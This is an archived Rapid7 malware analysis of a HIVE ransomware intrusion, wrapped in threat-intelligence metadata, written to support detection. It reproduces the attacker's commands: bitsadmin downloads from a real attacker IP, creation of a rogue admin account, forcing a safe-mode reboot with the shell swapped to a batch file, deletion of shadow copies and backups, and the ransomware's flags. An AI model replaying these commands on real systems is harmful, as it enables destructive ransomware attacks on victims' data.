{
    "id": "03d1b462-cacb-4376-8a91-3176a901300e",
    "created_at": "2023-02-02T02:07:23.535515Z",
    "updated_at": "2025-03-27T02:09:18.118754Z",
    "deleted_at": null,
    "sha1_hash": "948dfaa4628aab068aa2080367ff09b858fa1e22",
    "title": "2023-01-11 - Increasing The Sting of HIVE Ransomware",
    "authors": "",
    "file_creation_date": "2023-02-01T07:47:35Z",
    "file_modification_date": "2023-02-01T07:47:35Z",
    "file_size": 969383,
    "plain_text": "# Increasing The Sting of HIVE Ransomware\n\n**[rapid7.com/blog/post/2023/01/11/increasing-the-sting-of-hive-ransomware/](https://www.rapid7.com/blog/post/2023/01/11/increasing-the-sting-of-hive-ransomware/)**\n\nEoin Miller January 11, 2023\n\n_Last updated at Wed, 11 Jan 2023 20:24:43 GMT_\n\n### How malicious actors evade detection and disable defenses for more destructive HIVE Ransomware attacks.\n\nRapid7 routinely conducts research into the wide range of techniques that threat actors use\nto conduct malicious activity. One objective of this research is to discover new techniques\nbeing used in the wild, so we can develop new detection and response capabilities.\n\nRecently, Rapid7 observed a malicious actor performing several known techniques for\ndistributing ransomware across many systems within a victim’s environment. In addition to\nthose techniques, the actor employed a number of previously unseen techniques designed to\nto drop the defenses of the victim, inhibit monitoring, disable networking and allow time for\nthe ransomware to finish encrypting files. These extra steps would make it extremely difficult,\nif not impossible, for a victim to effectively use their security tools to defend endpoints after a\ncertain point in the attack.\n\nRapid7 has updated existing and added new detections to InsightIDR to defend against\nthese techniques. In this article, we’ll explore the techniques employed by the threat actor,\nwhy they’re so effective, and how we’ve updated InsightIDR to protect against them.\n\n### What approach did the malicious actor take to prepare the victim's environment?\n\n[Initially using Cobalt Strike, the malicious actor retrieved system administration tools and](https://www.cobaltstrike.com/)\n[malicious payloads by using the Background Intelligent Transfer Service (BITSAdmin).](https://learn.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool)\n```\n\"C:\\Windows\\system32\\bitsadmin.exe\" /transfer debjob /download /priority normal\nhttp://79.137.206.47/PsExec.exe C:\\Users\\Public\\PsExec.exe\n\nbitsadmin /transfer debjob /download /priority normal http://79.137.206.47/int.exe\nC:\\Windows\\int.exe\n\n\n```\n[The malicious actor then began using the remote process execution tool PSExec to execute](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)\n[batch files (rdp.bat) that would cause registry changes to enable Remote Desktop sessions](https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-terminalservices-localsessionmanager-fdenytsconnections)\n(RDP) using reg.exe. This enabled the malicious actor to laterally move throughout the\nvictim’s environment using the graphical user interface.\n\n\n-----\n\n```\nPSEXESVC.exe: C:\\Windows\\PSEXESVC.exe cmd.exe: C:\\Windows\\system32\\cmd.exe /c\n\"\"rdp.bat\" \"└── reg.exe: reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal\nServer\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0 /f\n\n```\nRapid7 observed the malicious actor add/change policies for the Active Directory domain to\nperform the following:\n\n1. Copy down batch scripts\n2. Execute batch scripts (file1.bat), which:\n3. Creates administrator account on the local system\n[4. Reconfigures boot configuration data (bcdedit.exe) so that the host will not load any](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bcdedit)\n\nadditional drivers or services (ie: network drivers or endpoint protection)\n5. Sets various registry values to ensure the created local administrator user will\n\nautomatically logon by default\n[6. Changes the Windows Shell from Explorer to their malicious script (file2.bat)](https://en.wikipedia.org/wiki/Windows_shell)\n7. Reboots the system with the shutdown command\n8. On reboot, the system logs in and executes the shell (file2.bat), which:\n9. Extracts HIVE ransomware payload(s) from an encrypted archive (int.7z) using 7\nZip's console executable (7zr.exe)\n10. Executes the ransomware payload (int.exe or int64.exe)\n\nBelow are some commands observed executed by the malicious actor (with necessary\nredactions):\n\n\n-----\n\n```\nxcopy.exe /C/Q/H/Y/Z\n\n\"\\\\<REDACTED>\\sysvol\\<REDACTED>\\Policies\n{<REDACTED>}\\Machine\\Scripts\\Startup\\file1.bat\" \"C:\\windows\"\n\nxcopy.exe /C/Q/H/Y/Z\n\n\"\\\\<REDACTED>\\sysvol\\<REDACTED>\\Policies\\\n{<REDACTED>}\\Machine\\Scripts\\Startup\\file2.bat\" \"C:\\windows\"\n\nxcopy.exe /C/Q/H/Y/Z\n\n\"\\\\<REDACTED>\\sysvol\\<REDACTED>\\Policies\\\n{<REDACTED>}\\Machine\\Scripts\\Startup\\7zr.exe\" \"C:\\windows\"\n\nxcopy.exe /C/Q/H/Y/Z\n\n\"\\\\<REDACTED>\\sysvol\\<REDACTED>\\Policies\\{<REDACTED>}\\Machine\\Scripts\\Startup\\int.7z\"\n\"C:\\windows\\\"\n\nC:\\WINDOWS\\SYSTEM32\\cmd.exe /c \"C:\\windows\\file1.bat\"\n\nnet user <REDACTED> <REDACTED> /add\n\nC:\\WINDOWS\\system32\\net1 user <REDACTED> <REDACTED> /add\n\nnet user <REDACTED> /active:yes\n\nC:\\WINDOWS\\system32\\net1 user <REDACTED> /active:yes\n\nnet localgroup Administrators <REDACTED> /add\n\nC:\\WINDOWS\\system32\\net1 localgroup Administrators <REDACTED> /add\n\nbcdedit /set {default} safeboot minimal\n\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v\nLegalNoticeText /t REG_SZ /d \"\" /f\n\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v\nLegalNoticeCaption /t REG_SZ /d \"\" /f\n\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v\nLegalNoticeText /t REG_SZ /d \"\" /f\n\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v\nLegalNoticeCaption /t REG_SZ /d \"\" /f\n\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v\nAutoAdminLogon /t REG_SZ /d 1 /f\n\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v\nDefaultUserName /t REG_SZ /d <REDACTED> /f\n\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v\nDefaultPassword /t REG_SZ /d <REDACTED> /f\n\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v\nAutoLogonCount /t REG_DWORD /d 1 /f\n\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t\nREG_SZ /d \"C:\\windows\\file2.bat\" /f\n\nshutdown -r -f -t 10 -c \"Computer Will Now Restart In SAFE MODE...\"\n\n```\nRapid7 also observed the malicious actor extracting HIVE ransomware payload using 7zip's\nconsole application (7zr.exe) from encrypted 7zip archive (int.7z) with a simple password\n(123):\n```\n\"C:\\windows\\7zr.exe\" x c:\\windows\\int.7z -p123 -oc:\\windows\n\n```\nThe malicious actor then manually executed the ransomware (int.exe) once with only the\nrequired username:password combination passed to the -u flag. This presumably encrypted\nthe local drive and also all network shares the user had access to:\n```\n\"C:\\Windows\\int.exe\" -u <REDACTED>:<REDACTED>\"\n\n```\n\n-----\n\nThe malicious actor also manually executed the 64 bit version of the ransomware\n(int64.exe) once on a different host with the -no-discovery flag. This is likely intended to\noverride the default behavior and not discover network shares to encrypt their files. The -u\nflag was also passed and the same values for the username:password were provided as\nseen on the other host.\n```\nC:\\Windows\\int64.exe -u <REDACTED>:<REDACTED> -no-discovery\n\n### Why is this approach so effective?\n\n```\nDeployment of ransomware using Active Directory group policies allows the malicious actor\nto hit all systems in the environment for as long as that group policy is active in the victim’s\nenvironment. In this case, any system that was booting and connected to the environment\nwould receive the configuration changes, encrypted archive containing the ransomware, a\ndecompression utility to extract the ransomware, configuration changes and the order to\nreboot and execute. This can be especially effective if timed with deployments of patches\nthat require a reboot, done at the beginning of the day or even remotely using Powershell's\nStop-Computer cmdlet.\n\nStoring the ransomware within a 7zip encrypted archive (int.7z) with a password even as\nsimple as (123) makes the task of identifying the ransomware on disk or transmitted across\nthe network nearly impossible. This makes retrieval and staging of the malicious actors\npayload very difficult to spot by security software or devices (Antivirus, Web Filtering,\nIDS/IPS and more). In this case, the malicious actor has taken care to only put the encrypted\ncopy on the disk of a victim’s system and not execute it until they have fully dropped the\ndefenses on the endpoint.\n\nReconfiguring the default boot behavior to safeboot minimal and then executing a reboot\nunloads all but the bare minimum for the Windows operating system. With no additional\nservices, software or drivers loaded the system is at its most vulnerable. With no active\ndefenses (Antivirus or Endpoint Protection) the system comes up and tries to start its defined\nshell which has been swapped to a batch script (file2.bat) by the malicious actor.\n\nIt should be noted that in this state, there is no method of remotely interacting with the\n**system as no network drivers are loaded. In order to respond and halt the**\n**ransomware, each host must be physically visited for shutdown. Manually priming the**\nhost in this way is more effective than the existing capabilities of the HIVE ransomware which\nstops specific defensive services (Windows Defender, etc) and kills specific processes prior\nto encrypting the contents of the drive.\n\nAll systems in this state are left automatically logged in as an administrator, which gives\nanyone who has physical access complete control. Lastly, the system will continue to boot\ninto safeboot minimal mode by default (again, no networking) until each system is set back to\n\n\n-----\n\nits original state with a command such as below. Bringing the host back online in this state\nwill still continue to execute the malware when logged into, which will also enable the default\nnetwork spreading behavior.\n```\nbcdedit /deletevalue {default} safeboot\n\n```\nLastly, the malicious actor also manually executed the payload a few times on systems that\nhad not been put into safeboot minimal and rebooted. Systems they executed with only the\n```\n-u flag actively searched out network shares they had access to and encrypted their\n\n```\ncontents. This ensures that only the intended hosts do network share encryption and all\nthose that were rebooted into safeboot minimal do not flood the network simultaneously\nencrypting all files. It also means that the contents of network file shares that are not\nWindows based (various NAS devices, Linux hosts using Samba) will be encrypted even if\nthe payload is not actually deployed on that specific host. This approach would be extremely\ndestructive to both corporate environments and home users with network attached storage\n[systems for backups. Rapid7 notes that ThreatLocker have reported on similar activity in](https://threatlocker.com/)\n[their knowledge base article entitled Preventing BCDEdit From Being Weaponized.](https://threatlocker.kb.help/preventing-bcdedit-from-being-weaponized/)\n\n### Malware analysis of HIVE sample\n\nRapid7 observed that the HIVE payload would not execute unless a flag of -u was passed.\nDuring analysis it was discovered that passing -u asdf:asdf would result in the Login and\nPassword (colon-delimited) provided to the victim to authenticate to the site behind the onion\nlink on the TOR network:\n\n\n-----\n\nThis, and other behaviors were previously reported on by Microsoft's article Hive\n[Ransomware Gets Upgrades in Rust and also by Sophos in their Github Repository of IoC's](https://github.com/sophoslabs/IoCs/blob/master/Ransomware_Hive%20-%20triple%20ransomware%20attack.csv)\nmentioned in their article Lockbit, Hive, and BlackCat attack automotive supplier in triple\nransomware attack. There have been some flags that are noted to exist, but their features\nare not documented. Rapid7 has analyzed the behaviors of these flags, documented them in\naddition to discovering two new flags (-timer, -low-key) in the HIVE ransomware samples.\n\nThe new flags -t, -timer, --timer effectively cause the malware to wait the specified\nnumber of seconds before going on to perform its actions. The other new flags -low-key, ```\n-low-key will cause the ransomware to focus on only its encryption of data and not perform\n\n```\npre-encryption tasks, including deleting shadow copies (malicious use of vssadmin.exe,\n```\nwmic.exe), deleting backup catalogs (malicious use of wbadmin.exe), and disabling Windows\n\n```\nRecovery Mode (malicious use of bcdedit.exe). These features give the malicious actor\nmore control over how/when the payload is executed and skirt common methods of\ncommand line and parent/child process related detection for most ransomware families.\n\nFundamentally, the sample’s respective flags distill down into encryption operations of local,\n```\nmount and discovery. The local module utilizes the LookupPrivilegeValueW and\n\n```\n[AdjustTokenPrivileges that Windows API calls on its own process via GetCurrentProcess and](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges)\n[OpenProcessToken to obtain SeDebugPrivilege privileges. This is presumably crucial for](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken)\n[OpenProcess ->](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess#remarks:~:text=To%20open%20a%20handle%20to%20another%20local%20process%20and%20obtain%20full%20access%20rights%2C%20you%20must%20enable%20the%20SeDebugPrivilege%20privilege.%20For%20more%20information%2C%20see%20Changing%20Privileges%20in%20a%20Token.) [OpenProcessToken ->](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken) [ImpersonateLoggedOnUser API call attempts to](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser)\n\n\n-----\n\nprocesses: winlogon.exe and trustedinstaller.exe to subsequently stop security\nservices and essential processes, if the --low-key is not passed during execution.\n[ShellExecuteA is also used to launch various Windows binaries (bcdedit.exe,](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea)\n```\nnotepad.exe, vssadmin.exe, wbadmin.exe, wmic.exe) for destruction of backups and\n\n```\n[ransom note display purposes. The mount module will use NetUseEnum to identify the](https://learn.microsoft.com/en-us/windows/win32/api/lmuse/nf-lmuse-netuseenum)\ncurrent list of locally-mounted network shares and add them to the list to be encrypted.\n[Lastly, the discovery module will use NetServerEnum to identify available Windows hosts](https://learn.microsoft.com/en-us/windows/win32/api/lmserver/nf-lmserver-netserverenum)\n[within the domain/workgroup. This list is then used with NetShareEnum to identify file shares](https://learn.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netshareenum)\non each remote host and add them to the list of locations to have their files encrypted.\n\nBy default, all three modes (local, mount and discovery)are enabled, so all local, mounted\nand shares able to be enumerated will have their contents encrypted. This effectively\nransoms all systems in a victim’s environment with a single execution of HIVE—when\nperformed by a privileged user such as a Domain or Enterprise Admin account. Command\nline flags may be used to change this behavior and invoke one or more of the modules. For\ninstance—local-only will use only the local module while—network-only will use the mount\nand discovery modules.\n\nFlag Description\n\n-u <username>:<password> for login for hivecust*.onion domain to identify victim\n\n-da <domainname>\\<username>:<password> use different credentials when doing\nnetwork spreading. Likely shorthand for \"Domain Admin\". Calls\n[LogonUserW triggering an 4624(S): Type 3 Network Logon event. Will then](https://www.google.com/url?q=https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonuserw&sa=D&source=editors&ust=1673390739478720&usg=AOvVaw3Frw_XTtdr9cWzVO2mH8OU)\n[call ImpersonateLoggedOnUser using the token in the response from](https://www.google.com/url?q=https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser&sa=D&source=editors&ust=1673390739479197&usg=AOvVaw3VOIJUJAtqHy9n8LVPoIZc)\nLogonUserW.\n\n\n-low-key\n\n--low-key\n\n-no-local\n\n--no-local\n\n-nomounted\n\n--nomounted\n\n\nEncrypt files and open ransom note, if local filesystem is to be encrypted, but\ndo not spawn other binaries (vssadmin.exe, WMIC.exe, wbadmin.exe,\nbcdedit.exe) to perform other destructive actions for impact. Will also skip\nenumeration and stopping of antivirus software.\n\nDo not encrypt local files\n\nDo not encrypted mounted filesystems\n\n\n-----\n\n-nodiscovery\n\n--nodiscovery\n\n-localonly\n--localonly\n\n-networkonly\n-networkonly\n\n-explicitonly\n--explicitonly\n\n-min-size\n\n--minsize\n\n-t\n\n-timer\n\n--timer\n\n\nDo not enumerate or encrypt file shares on the network\n\nOnly encrypt local file systems\n\nOnly encrypt file shares on the network.\n\nOnly encrypt files in this specific path specified\n\nOnly encrypt files greater than or equal to a specific number of bytes\n\nDo not encrypt files until after specified number of seconds\n\n\nBy default, the ransomware will execute the following child processes with the following\narguments:\n\nUse of vssadmin.exe in order to delete shadow copies of files which deletes unencrypted\nbackups of files they are attempting to ransom:\n```\n\"C:\\Windows\\System32\\vssadmin.exe\" delete shadows /all /quiet\n\n```\nUse of wmic.exe to create calls that also delete all shadow copies of files which deletes\nunencrypted backups of files they are attempting to ransom:\n```\n\"C:\\Windows\\System32\\wbem\\WMIC.exe\" shadowcopy delete\n\n```\nUse of wbadmin.exe to delete backup catalogs:\n\n\n-----\n\n```\n C:\\Windows\\System32\\wbadmin.exe delete systemstatebackup\n\"C:\\Windows\\System32\\wbadmin.exe\" delete catalog-quiet\n\"C:\\Windows\\System32\\wbadmin.exe\" delete systemstatebackup -keepVersions:3\n\n```\nUse of bcdedit.exe to disable automatic repair and ignore errors when booting:\n```\n\"C:\\Windows\\System32\\bcdedit.exe\" /set {default} recoveryenabled No\n\"C:\\Windows\\System32\\bcdedit.exe\" /set {default} bootstatuspolicy\nignoreallfailures\n\n```\nLastly, also opening up notepad.exe to display the ransom note with instructions to the\nvictim on how to pay:\n```\n\"C:\\Windows\\System32\\notepad.exe\" C:\\HOW_TO_DECRYPT.txt\n\n## Rapid7 Protection\n\n```\nRapid7 has detections in place within InsightIDR through Insight Agent to detect this type of\nransomware activity. However, since the malicious actor is rebooting into safemode minimal\nstate, endpoint protection software and networking will not be running while the endpoint is\nexecuting ransomware.\n\nSo, identifying the actions of a malicious actor before ransomware is deployed is crucial to\npreventing the attack. In other words, it is essential to identify malicious actors within the\nenvironment and eject them before the ransomware payload is dropped.\n\nThe following detections are now available InsightIDR to identify this attacker behavior.\n\nAttacker Technique - Auto Logon Count Set Once\nAttacker Technique - Potential Process Hollowing To DLLHost\nAttacker Technique - Shutdown With Message Used By Malicious Actors\nAttacker Technique - URL Passed To BitsAdmin\nLateral Movement - Enable RDP via reg.exe\nSuspicious Process - BCDEdit Enabling Safeboot\nSuspicious Process - Boot Configuration Data Editor Activity\nSuspicious Process - DLLHost With No Arguments Spawns Process\nSuspicious Process - Rundll32.exe With No Arguments Spawns Process\nSuspicious Process - ShadowCopy Delete Passed To WMIC\nSuspicious Process - Volume Shadow Service Delete Shadow Copies\n\n**IOC's**\n\n\n-----\n\nType Value\n\n\nRegistry\nKey\n\nRegistry\nValue\n\n\nHKLM\\System\\CurrentControlSet\\Control\\Terminal Server\n\nType: DWORD Name: fDenyTSConnections Value: 0\n\n\nFilename rdp.bat\n\nFilename file1.bat\n\nFilename file2.bat\n\nFilename int.7z\n\nFilename int64.exe\n\nMD5 89ea20880a6aae021940a8166ff85ee8\n\nSHA1 4af769fb3109c754bc879201c61242217a674a2e\n\nSHA256 067af912ceddb1ea181490f2b3b5a323efcac61c82207833cda70c21c84460cb\n\nFilename int.exe\n\nMD5 8fba0d57696ccf672ddcea4ba4d0e885\n\nSHA1 31097a7f91d182755fc63ebf023bff54cda5ae9c\n\nSHA256 184a0f96cef09408b192767b405b0266403c9ec429945c1a78703f04f18c7416\n\n\nIP\nAddress\n\n\n79.137.206[.]47\n\n\nFQDN paloaltocloud[.]online\n\n\n-----\n\nFQDN maxkey[.]online\n\nFQDN keycloud[.]live\n\nFQDN microcloud[.]online\n\nFQDN microcloud[.]live\n\n\nIP\nAddress\n\nIP\nAddress\n\nIP\nAddress\n\nIP\nAddress\n\nIP\nAddress\n\n\n194.135.24[.]241\n\n179.43.142[.]230\n\n77.73.133[.]80\n\n77.73.134[.]27\n\n77.73.134[.]10\n\n\n**MITRE ATT&CK**\n\n**Techniques**\n[T1021 - Remote Services](https://attack.mitre.org/techniques/T1021)\n\n[T1021.001 - Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001)\n\n[T1021.002 - SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002)\n\n[T1027 - Obfuscated Files Or Information](https://attack.mitre.org/techniques/T1027)\n[T1027.009 - Embedded Payloads](https://attack.mitre.org/techniques/T1027/009)\n\n[T1037 - Boot Or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037)\n\n[T1037.003 - Network Logon Script](https://attack.mitre.org/techniques/T1037/003)\n\n[T1059 - Command And Scripting Interpreter](https://attack.mitre.org/techniques/T1059)\n\n[T1059.001 - PowerShell](https://attack.mitre.org/techniques/T1059/001)\n\n[T1059.003 - Windows Command Shell](https://attack.mitre.org/techniques/T1059/003)\n\n[T1070 - Indicator Removal](https://attack.mitre.org/techniques/T1070/)\n\n[T1080 - Taint Shared Content](https://attack.mitre.org/techniques/T1080)\n\n[T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)\n\n[T1112 - Modify Registry](https://attack.mitre.org/techniques/T1112)\n\n\n-----\n\n[T1135 - Network Share Discovery](https://attack.mitre.org/techniques/T1135)\n[T1136 - Create Account](https://attack.mitre.org/techniques/T1136)\n\n[T1136.001 - Local Account](https://attack.mitre.org/techniques/T1136/001)\n\n[T1140 - Deobfuscate/Decode Files Or Information](https://attack.mitre.org/techniques/T1140)\n\n[T1197 - BITS Jobs](https://attack.mitre.org/techniques/T1197/)\n\n[T1480 - Execution Guardrails](https://attack.mitre.org/techniques/T1480/)\n\n[T1484 - Domain Policy Modification](https://attack.mitre.org/techniques/T1484)\n\n[T1484.001 - Group Policy Modification](https://attack.mitre.org/techniques/T1484/001)\n\n[T1485 - Data Destruction](https://attack.mitre.org/techniques/T1485/)\n\n[T1486 - Data Encrypted For Impact](https://attack.mitre.org/techniques/T1486/)\n\n[T1489 - Service Stop](https://attack.mitre.org/techniques/T1489/)\n\n[T1490 - Inhibit System Recovery](https://attack.mitre.org/techniques/T1490/)\n\n[T1529 - System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529/)\n\n[T1547 - Boot Or Logon Autostart Execution](https://attack.mitre.org/techniques/T1547)\n\n[T1560 - Archive Collected Data](https://attack.mitre.org/techniques/T1560)\n\n[T1560.001 - Archive Via Utility](https://attack.mitre.org/techniques/T1560/001)\n\n[T1562 - Impair Defenses](https://attack.mitre.org/techniques/T1562)\n\n[T1562.001 - Disable Or Modify Tools](https://attack.mitre.org/techniques/T1562/001)\n\n[T1562.009 - Safe Mode Boot](https://attack.mitre.org/techniques/T1562/009)\n\n[T1570 - Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)\n\n**Software**\n\n[S0029 - PSExec](https://attack.mitre.org/software/S0029/)\n\n[S0075 - Reg](https://attack.mitre.org/software/S0075/)\n\n[S0190 - BITSAdmin](https://attack.mitre.org/software/S0190/)\n\n[S0154 - Cobalt Strike](https://attack.mitre.org/software/S0154/)\n\n_Jakob Denlinger conducted malware analysis for this report._\n\n\n-----\n\n## Never miss a blog\n\nGet the latest stories, expertise, and news about security today.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-01-11 - Increasing The Sting of HIVE Ransomware.pdf"
    ],
    "report_names": [
        "2023-01-11 - Increasing The Sting of HIVE Ransomware.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1675303643,
    "ts_updated_at": 1743041358,
    "ts_creation_date": 1675237655,
    "ts_modification_date": 1675237655,
    "files": {
        "pdf": "https://archive.orkl.eu/948dfaa4628aab068aa2080367ff09b858fa1e22.pdf",
        "text": "https://archive.orkl.eu/948dfaa4628aab068aa2080367ff09b858fa1e22.txt",
        "img": "https://archive.orkl.eu/948dfaa4628aab068aa2080367ff09b858fa1e22.jpg"
    }
}